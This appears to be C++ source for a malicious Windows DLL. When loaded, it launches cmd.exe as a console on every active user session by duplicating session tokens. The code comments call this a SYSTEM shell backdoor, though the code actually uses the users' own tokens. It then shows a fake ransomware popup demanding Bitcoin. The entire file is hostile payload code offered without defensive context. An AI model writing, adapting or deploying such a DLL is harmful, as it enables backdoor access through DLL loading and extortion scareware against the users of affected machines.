#include <windows.h>
#include <thread>
#include <string>


void ShowFakeRansomNote() {
    MessageBoxA(NULL,
        "Your files have been encrypted.\n\nSend 0.5 BTC to the wallet address below:\n1FakeBTCAddrXYZ999\n\nDo not power off your machine!",
        "!!! YOUR SYSTEM IS LOCKED !!!",
        MB_OK | MB_ICONERROR);
}

bool RunProcessAsSystemOnActiveSessions(const std::wstring& processPath) {
    WTS_SESSION_INFO* sessions = nullptr;
    DWORD count = 0;
    bool result = false;

    if (WTSEnumerateSessions(WTS_CURRENT_SERVER_HANDLE, 0, 1, &sessions, &count)) {
        for (DWORD i = 0; i < count; ++i) {
            if (sessions[i].State != WTSActive) continue;

            HANDLE userToken = nullptr;
            if (WTSQueryUserToken(sessions[i].SessionId, &userToken)) {
                HANDLE dupToken = nullptr;
                if (DuplicateTokenEx(userToken, MAXIMUM_ALLOWED, nullptr, SecurityIdentification, TokenPrimary, &dupToken)) {
                    LPVOID environment = nullptr;
                    if (CreateEnvironmentBlock(&environment, dupToken, FALSE)) {
                        STARTUPINFO si = { sizeof(si) };
                        si.lpDesktop = const_cast<LPWSTR>(L"winsta0\\default");
                        PROCESS_INFORMATION pi = {};

                        if (CreateProcessAsUserW(dupToken, processPath.c_str(), nullptr, nullptr, nullptr, FALSE,
                            CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE, environment, nullptr, &si, &pi)) {
                            CloseHandle(pi.hProcess);
                            CloseHandle(pi.hThread);
                            result = true;
                        }
                        DestroyEnvironmentBlock(environment);
                    }
                    CloseHandle(dupToken);
                }
                CloseHandle(userToken);
            }
        }
        WTSFreeMemory(sessions);
    }
    return result;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        std::thread([]() {
            RunProcessAsSystemOnActiveSessions(L"C:\\Windows\\System32\\cmd.exe");  // SYSTEM shell backdoor
            ShowFakeRansomNote();  // Scareware popup
            }).detach();
    }
    return TRUE;
}
